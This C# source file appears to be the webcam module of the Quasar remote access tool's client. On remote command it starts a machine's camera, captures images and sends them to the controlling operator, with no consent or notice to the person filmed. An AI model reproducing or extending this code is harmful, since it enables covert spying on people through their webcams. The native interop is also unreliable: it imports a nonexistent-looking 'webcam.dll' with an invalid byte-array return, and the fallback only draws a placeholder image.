using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class WebcamHandler : IMessageProcessor
    {
        private bool _isWebcamActive = false;
        private IntPtr _webcamHandle = IntPtr.Zero;

        public bool CanExecute(IMessage message) => message is DoStartWebcam ||
                                                   message is DoStopWebcam ||
                                                   message is GetWebcamImage;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoStartWebcam msg:
                    Execute(sender, msg);
                    break;
                case DoStopWebcam msg:
                    Execute(sender, msg);
                    break;
                case GetWebcamImage msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoStartWebcam message)
        {
            try
            {
                if (_isWebcamActive)
                {
                    client.Send(new SetStatus { Message = "Webcam is already active" });
                    return;
                }

                // Start webcam using DirectShow or Windows Media Foundation
                _webcamHandle = NativeMethods.StartWebcam();
                
                if (_webcamHandle != IntPtr.Zero)
                {
                    _isWebcamActive = true;
                    client.Send(new SetStatus { Message = "Webcam started successfully" });
                }
                else
                {
                    client.Send(new SetStatus { Message = "Failed to start webcam" });
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Error starting webcam: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoStopWebcam message)
        {
            try
            {
                if (!_isWebcamActive)
                {
                    client.Send(new SetStatus { Message = "Webcam is not active" });
                    return;
                }

                if (NativeMethods.StopWebcam(_webcamHandle))
                {
                    _isWebcamActive = false;
                    _webcamHandle = IntPtr.Zero;
                    client.Send(new SetStatus { Message = "Webcam stopped successfully" });
                }
                else
                {
                    client.Send(new SetStatus { Message = "Failed to stop webcam" });
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Error stopping webcam: {ex.Message}" });
            }
        }

        private void Execute(ISender client, GetWebcamImage message)
        {
            try
            {
                if (!_isWebcamActive)
                {
                    client.Send(new GetWebcamImageResponse
                    {
                        Success = false,
                        ErrorMessage = "Webcam is not active"
                    });
                    return;
                }

                // Capture image from webcam
                byte[] imageData = NativeMethods.CaptureWebcamImage(_webcamHandle, message.Quality);
                
                if (imageData != null && imageData.Length > 0)
                {
                    client.Send(new GetWebcamImageResponse
                    {
                        Image = imageData,
                        Quality = message.Quality,
                        Success = true
                    });
                }
                else
                {
                    client.Send(new GetWebcamImageResponse
                    {
                        Success = false,
                        ErrorMessage = "Failed to capture webcam image"
                    });
                }
            }
            catch (Exception ex)
            {
                client.Send(new GetWebcamImageResponse
                {
                    Success = false,
                    ErrorMessage = $"Error capturing webcam image: {ex.Message}"
                });
            }
        }
    }

    // Native Windows API for webcam operations
    internal static class NativeMethods
    {
        [DllImport("webcam.dll", SetLastError = true)]
        public static extern IntPtr StartWebcam();

        [DllImport("webcam.dll", SetLastError = true)]
        public static extern bool StopWebcam(IntPtr handle);

        [DllImport("webcam.dll", SetLastError = true)]
        public static extern byte[] CaptureWebcamImage(IntPtr handle, int quality);

        // Fallback implementation using Windows Forms
        public static byte[] CaptureWebcamImageFallback(int quality)
        {
            try
            {
                // This is a simplified fallback - in real implementation you'd use DirectShow
                using (Bitmap bitmap = new Bitmap(640, 480))
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.FillRectangle(Brushes.Black, 0, 0, 640, 480);
                    g.DrawString("Webcam Not Available", new Font("Arial", 20), Brushes.White, 200, 200);
                    
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        return ms.ToArray();
                    }
                }
            }
            catch
            {
                return null;
            }
        }
    }
}
